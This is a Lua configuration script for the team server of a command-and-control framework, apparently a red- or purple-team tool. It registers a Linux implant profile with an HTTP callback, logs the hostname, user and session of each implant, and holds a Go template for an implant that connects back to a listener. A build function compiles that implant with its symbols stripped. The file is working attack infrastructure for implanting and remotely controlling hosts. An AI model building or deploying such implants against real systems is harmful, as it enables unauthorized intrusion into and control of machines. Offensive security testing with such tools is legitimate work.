--[[
function OnRegister(...)
    local args = {...}
    print("Name:", args[1])
    print("UUID:", args[2])
    print("Hostname:", args[3])
    print("User:", args[4])
    print("Socket:", args[5])
    print("Session ID:", args[6])
    print("Payload type:", args[7])
end

function OnCheck(...)
    local args = {...}
    print("Name:", args[1])
    print("UUID:", args[2])
    print("Hostname:", args[3])
    print("User:", args[4])
    print("Socket:", args[5])
    print("Session ID:", args[6])
    print("Task:", args[7])
    print("Data:", args[8])
    print("Payload type:", args[9])
end

function OnResponse(...)
    local args = {...}
    print("Name:", args[1])
    print("UUID:", args[2])
    print("Hostname:", args[3])
    print("User:", args[4])
    print("Socket:", args[5])
    print("Session ID:", args[6])
    print("Task:", args[7])
    print("Response:", args[8])
    print("Payload type:", args[9])
end
]]

-- Load the bundled implant commands relative to this file. TeamServer may be
-- launched from any working directory, so a process-relative path is unsafe.
local main_source = debug.getinfo(1, "S").source
local main_path = string.sub(main_source, 1, 1) == "@" and string.sub(main_source, 2) or main_source
local script_directory = string.match(main_path, "^(.*)[/\\]") or "."
local commands_path = script_directory .. "/payload-commands.lua"
local commands_chunk, commands_error = loadfile(commands_path)
if not commands_chunk then
    error("could not load bundled payload commands from " .. commands_path .. ": " .. tostring(commands_error))
end
commands_chunk()

-- Registering implants
local IMPLANT_DEF = {
    OS = {"linux"},
    ARCH = {"amd64", "i386"},
    PROTOCOL = "http",
    TYPE = "impl",
    BUILDER = "implant-builder-linux-amd64",
    SLEEP = 10,

    OPTIONS = {
        PATH = "/",
        HEADER = {
            ["User-Agent"] = "",
            ["X-Test"] = "Test"
        }
    }
    --OTS = "example-one-time-secret"
}

implant_register_profile("linux-impl", IMPLANT_DEF)

function impl_build(profile_name)
    local profile = implant_profile(profile_name)
    local source = [[
package main

import (
    "purpcmd/implant/core"
)

var publicKeyDER []byte

func main() {
    remoteAdd := "LHOST"
    payloadType := "IMPLANT_TYPE"


    if len(publicKeyDER) > 0 {
        if err := core.SetPublicKeyDER(publicKeyDER); err != nil {
            panic(err)
        }
    }

    core.Start(remoteAdd, payloadType)
}
]]

    if profile.project_root == "" then
        error("could not locate go.mod above template " .. profile.template)
    end

    local path = "/tmp/impl-linux/"
    local source_path = path .. "main.go"
    local write_err = os.write(source, source_path)
    if write_err then
        os.remove(source_path)
        error("os.write: " .. write_err)
    end

    os.exec(
        "cd " .. os.quote(profile.project_root) ..
        " && GOARCH=" .. os.quote(profile.arch) ..
        " go build -ldflags '-s -w' -o " ..
        os.quote(profile.output) .. " " ..
        os.quote(source_path)
    )
end

function build_env_test(profile_name)
    local profile = implant_profile(profile_name)

    print("Profile:", profile.name)
    print("Target:", profile.os .. "/" .. profile.arch)
    print("Callback:", profile.lhost)
    print("Output:", profile.output)
    print("Project root:", profile.project_root)

    for _, os_name in ipairs(profile.os_options) do
        print("Supported OS:", os_name)
    end

    for _, arch in ipairs(profile.arch_options) do
        print("Supported architecture:", arch)
    end
end

payload_build(
    "implant-builder-linux-amd64",
    "Build implant impl for Linux.",
    impl_build
)

function Main()
end
